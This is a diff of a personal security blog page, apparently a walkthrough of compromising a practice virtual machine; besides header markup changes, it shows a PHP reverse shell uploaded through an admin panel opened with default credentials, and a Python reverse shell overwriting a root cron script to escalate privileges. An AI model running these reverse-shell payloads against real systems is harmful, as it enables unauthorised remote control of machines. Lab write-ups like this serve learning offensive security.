@@ -12,13 +12,13 @@
   <body>
 	<div class="container">
         <header>
-		<div>mmmds's blog</div>	
-         	<nav>
+		<div id="logo">mmmds's blog</div>	
+         	<nav>|
             	<a href="/">posts</a>
 				|
             	<a href="/projects/">projects</a>
 				|
-            	<a href="/about/">about</a>
+            	<a href="/about/">about</a> |
         	</nav>
         </header>
       </div>
@@ -49,9 +49,9 @@ Default credentials worked and I got access to administration panel.</p>
 
 <p>From this place I was able to upload reverse shell and connect to VM.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/8888 0&gt;&amp;1'"</span><span class="p">);</span>
-<span class="cp">?&gt;</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/8888 0&gt;&amp;1'");
+?&gt;
 </code></pre></div></div>
 
 <p>After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunately I had permission to overwrite this file.</p>
@@ -60,9 +60,9 @@ Default credentials worked and I got access to administration panel.</p>
 
 <p>I uploaded reverse shell again, but this time written in python.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
-</span><span class="kn">import</span> <span class="nn">os</span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/9999 0&gt;&amp;1'"</span><span class="p">)</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python
+import os
+os.system("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.175.1/9999 0&gt;&amp;1'")
 </code></pre></div></div>
 
 <p>I used existing shell to overwrite script with uploaded one, then I ran netcat on port 9999 and waited one minute until I got root shell.</p>
